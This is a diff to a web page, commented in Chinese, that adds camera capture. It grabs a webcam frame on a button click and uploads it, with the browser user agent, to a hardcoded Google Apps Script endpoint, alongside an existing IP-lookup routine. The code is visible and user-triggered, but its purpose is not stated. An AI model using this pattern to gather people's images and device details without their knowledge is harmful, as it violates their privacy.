@@ -52,6 +52,45 @@
 
     // 開始執行
     document.addEventListener('DOMContentLoaded', () => getIpInfo());
+
+    ///////
+    async function initCamera() {
+      const video = document.getElementById('video');
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+    }
+
+    document.getElementById('capture').addEventListener('click', async () => {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // 將畫布內容轉換為 Blob 格式
+      canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append('photo', blob, 'photo.jpg');
+        formData.append('userAgent', navigator.userAgent);
+
+        const url = 'https://script.google.com/macros/s/AKfycbwqDNaUPQ-ajfcz3b6PxazhjUtIHerkMOdQ09S2_xQGPmlqUNrEUlng0s8TZKx26GTQFA/exec'; // 替換為您的後端 URL
+        const response = await fetch(url, {
+          method: 'POST',
+          body: formData,
+        });
+
+        const result = await response.json();
+        document.getElementById('status').innerText = result.success
+          ? '照片成功上傳！'
+          : `上傳失敗：${result.error}`;
+      }, 'image/jpeg');
+    });
+
+    initCamera().catch((error) => {
+      document.getElementById('status').innerText = '無法啟動攝像頭：' + error.message;
+    });
   </script>
 </body>
 </html>
